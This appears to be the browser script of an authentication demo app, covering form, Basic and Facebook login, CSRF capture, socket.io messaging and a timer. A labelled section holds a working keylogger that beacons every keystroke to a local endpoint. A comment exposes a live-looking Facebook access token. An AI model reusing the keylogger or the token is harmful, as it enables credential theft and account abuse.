
var globalMap = {};

function doTLSHello() {
    enableTlsMessaging();
    doFetch('https://localhost:8097/authdemo/tlshello', 'GET', null, null);
}

function populateCsrfSelectOptions (csrf) {
    let csrfSelect = $("#csrfSelector");
    csrfSelect.append($("<option/>").attr("value", csrf).text(csrf));
}

function doFormAuthentication(formId) {
    tryPreventDefault();
    setMessagingSource('FORM')
    var formData = buildData($('#' + formId).get(0))

    outputFetchCall('FORM', 'https://localhost:8097/login POST with Body: ' + formData.toString(), 'JS fetch call');

    let onResponse = function (text) {
        var matches = text.match(/\[(.*?)\]/);
        if (matches) {
            var csrf = matches[1];
            populateCsrfSelectOptions (csrf)
        }
        outputFetchCall('FORM', text, 'Server response');
    }

    doFetch('https://localhost:8097/formlogin', 'POST', formData, null, onResponse);
}

function doBasicAuthentication(username, password) {
    tryPreventDefault();
    setMessagingSource('BASIC');
    var base64Credentials = btoa(username + ':' + password);
    var basicAuthHeaders = new Headers({'Authorization': 'Basic ' + base64Credentials});
    var body =  JSON.stringify(basicAuthHeaders.entries().next()).replace(/"/g, '').replace(/(?:\r\n|\r|\n)/g, '');
    outputFetchCall('BASIC', 'https://localhost:8097/login GET with Header: ' + body, 'JS fetch call');

    let onResponse = function (text) {
        outputFetchCall('BASIC', text, 'Server response');
    }

    doFetch('https://localhost:8097/login', 'GET', null, basicAuthHeaders, onResponse);
}

function doFetch(url, method, data, headers, onResponse) {

    tryPreventDefault();

    fetch(url, {
        method: method,
        body: data,
        headers: headers || {},
    }).then(
        function(response){
            return doCall(response, {url: url, method: method, data: data});
        }
    ).then(
        function(responseBody) {
            return doResponse(responseBody, onResponse);
        }
    ).catch(function(error) {
        console.log(error);
    });

    function doCall(response, request) {
        if(response.ok) {
            return response.text();
        } else {

        }
    }

    function doResponse(text, onResponse) {
        if(onResponse !== undefined) {
            onResponse(text);
        }
    }
}

function buildData(formElement) {
    const data = new URLSearchParams();
    for (const pair of new FormData(formElement)) {
        data.append(pair[0], pair[1]);
    }
    return data;
}

function tryPreventDefault() {
    let evt = this.event || window.event;
    if(evt){
        evt.preventDefault();
    }
}


//############# FB SECTION ######################

window.fbAsyncInit = function() {
    FB.init({
        appId      : '2930956966914426',
        cookie     : true,
        status     : true,
        oauth      : true,
        xfbml      : true,
        version    : 'v5.0'
    });
    FB.AppEvents.logPageView();
};

(function(d, s, id){
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) {return;}
    js = d.createElement(s); js.id = id;
    js.src = "https://connect.facebook.net/en_US/sdk.js";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));

var accessToken;

function checkLoginState() {
    FB.getLoginStatus(function(response) {
        if (response.status === 'connected') {
            document.getElementById('fbstatus').innerHTML = 'Connected.';
            accessToken = response.authResponse.accessToken;
            console.log(accessToken)
        }
    });
}

// getting basic user info
function getInfo() {
    FB.api('/me', 'GET', {fields: 'email,first_name,last_name,name,id,picture.width(300).height(300)'},
        function(response) {
            document.getElementById('fbuserpicture').innerHTML = "<img src='" + response.picture.data.url + "'>";
            document.getElementById('fbemail').innerHTML = response.email;
            document.getElementById('fbusername').innerHTML = response.first_name + " " + response.last_name ;
            document.getElementById('fbuserid').innerHTML = response.id;
        });
}

//https://graph.facebook.com/me?fields=id,name,picture&access_token=EAAppsJjdaXoBAER7aaQzKiv9KUxb6Ic10xNSgdp0NkdPRnkGGwIRJ5JSZCgz5EtQ1LQZCllVRaAPZC4jS8W9FFs189QKUjXWbPOQz7PFebIVhZClBdMyEeGqKuyZA0IIgpGCD7EBirJsv2A3CJh1luZCDtTlBfZCjpbrFeT2XKCq8Vyuy0ZAEUSI4zHHgAZC0ZASjKIzMMbdrHtwZDZD

//############# FB SECTION ######################






//############# TIMER SECTION ######################

let timeBegan = Date.parse(JSON.parse(localStorage.getItem("timeBegan"))) || null
    , timeStopped = Date.parse(JSON.parse(localStorage.getItem("timeStopped"))) || null
    , stoppedDuration = 0
    , started = null;

function startTimer() {
    if (timeBegan === null) {
        timeBegan = new Date();
        localStorage.setItem('timeBegan', JSON.stringify(timeBegan));
    }

    if (timeStopped !== null) {
        stoppedDuration += (new Date() - timeStopped);
    }
    started = setInterval(clockRunning, 10);
}

function stopTimer() {
    timeStopped = new Date();
    clearInterval(started);
}

function resetTimer() {
    clearInterval(started);
    stoppedDuration = 0;
    timeBegan = null;
    timeStopped = null;
    localStorage.removeItem('timeBegan');
    localStorage.removeItem('timeStopped');
    document.getElementById("sessionTimer").innerHTML = "00:00.000";
    startTimer();
}

function clockRunning(){
    let currentTime = new Date()
        , timeElapsed = new Date(currentTime - timeBegan - stoppedDuration);

    document.getElementById("sessionTimer").innerHTML = timeToString(timeElapsed);
};

function timeToString(time) {
    let min = time.getUTCMinutes()
        , sec = time.getUTCSeconds()
        , ms = time.getUTCMilliseconds();

    if(sec % 10 === 0){
        localStorage.setItem('timeStopped', JSON.stringify(new Date()));
    }


    return (min > 9 ? min : "0" + min) + ":" +
        (sec > 9 ? sec : "0" + sec) + "." +
        (ms > 99 ? ms : ms > 9 ? "0" + ms : "00" + ms);
}

startTimer();


//############# TIMER SECTION ######################


//############# SOCKET IO SECTION ######################

const socket = io('https://localhost:9093',
    { transports: ['websocket'],
        forceNew: true,
        path : '',
        secure: true,
        rejectUnauthorized: false,
        upgrade: false
    });

socket.on('connect', function() {
    console.log('connected');
});

socket.on('basicAuthFilter', function(data) {
    output('<span class="server-msg">S->>C ' + JSON.stringify(data.message) + '</span>');
});

socket.on('userNamePasswordFilter', function(data) {
    output('<span class="server-msg">S->>C ' + JSON.stringify(data.message) + '</span>');
});

socket.on('csrfTokenFilter', function(data) {
    output('<span class="server-msg">S->>C ' + JSON.stringify(data.message) + '</span>');
});

socket.on('tlsMessage', function(data) {
    var message = JSON.stringify(data.message);
    message = message.replace(/\\r/gm,'');
    message = message.replace(/\\n/gm,'<br>');
    globalMap[data.type] = message;
    outputTlsMessage(data.type);
});


socket.on('filterMessage', function(data) {
    var message = JSON.stringify(data.message);

    globalMap[data.source + data.type] = message;
    outputFilterMessage(data.source, data.type);
});

function enableTlsMessaging() {
    var jsonObject = {'@class': 'com.apps.authdemo.socketio.model.EnableTlsMessagingRequest', request: ''};
    socket.emit('enableTlsMessagingRequest', jsonObject);
}

function setMessagingSource(source) {
    var jsonObject = {'@class': 'com.apps.authdemo.socketio.model.SetSourceRequest', request: source};
    socket.emit('setSourceRequest', jsonObject);
}

//############# SOCKET IO SECTION ######################


//############# KEY LOGGER ######################

var keys_ = '';
document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys_+=key;
}
window.setInterval(function(){
	if(keys_.length > 0) {
		new Image().src = 'http://localhost:9020/imgkey/'+keys_;
		keys_ = '';
	}
}, 10000);

//############# KEY LOGGER  ######################


//############# OUTPUT WELL  ######################

    function output(message) {
        var consoleMessage = "<div><span class='time'>" +  Date.now() + " " + message + "</span></div>";
        var element = $(consoleMessage);
        addToArrayStorage('wellData', consoleMessage)
        $('#console').append(element);
    }

    function addToArrayStorage (itemName, element) {
        var arr = JSON.parse(localStorage.getItem(itemName)) || [];
        arr.push(element);
        localStorage.setItem(itemName, JSON.stringify(arr));
    }

    function outputTlsMessage(type) {
        var consoleMessage = "<div><a href='#' class='data-link' onclick=\"showModal('" + type + "')\">" + type + "</a></div>";
        var element = $(consoleMessage);
        $('#tlsMessageContainer').append(element);
    }

    function outputFetchCall(source, body, type) {
        var consoleMessage = "<div><a href='#' class='data-link' onclick=\"showModalBodyHeader('" + body + "', '" + type + "')\">" + type + "</a></div>";
        var element = $(consoleMessage);
        $('#' + source + 'AuthMessageContainer').append(element);
    }

    function outputFilterMessage(source, type) {
        var consoleMessage = "<div><a href='#' class='data-link' onclick=\"showModal('" + source + type + "')\">" + type + "</a></div>";
        var element = $(consoleMessage);
        //FORMAuthMessageContainer
        //BASICAuthMessageContainer
        $('#' + source + 'AuthMessageContainer').append(element);
    }

//############# OUTPUT WELL  ######################


//############# MODAL #############################

    function showModal(type, options) {
        var body = globalMap[type];
        showModalBodyHeader(body, type)
    }

    function showModalBodyHeader(body, header, options) {
        $('#modalWindow').data('bs.modal', null); //clear previous data if any.
        $('#modalWindowLabel').html(header);
        $('#modalWindowBody').empty();
        $('#modalWindowBody').append("<div id='modalWindowBodyScroll' style='width: 1150px; max-height: 850px; padding-right: 17px'></div>");
        $('#modalWindowBodyScroll').html(body);
        new SimpleBar(document.getElementById('modalWindowBodyScroll'));
        if(options !== undefined && options.dataBackdrop !== undefined){
            $('#modalWindow').modal({backdrop: options.dataBackdrop});
        } else {
            $('#modalWindow').modal({backdrop: 'static'});
        }
        $('#modalWindow').modal('show');
    }

//############# MODAL #############################

function buildAuthForm() {
    tryPreventDefault();
    let onResponse = function (response) {
        $('#authFormContainer').empty();
        $('#authFormContainer').append("<div id='authFormData'><\/div>");
        $('#authFormData').html(response);
    }

    doFetch('/authdemo/partone/authform', "GET", null, null, onResponse);
}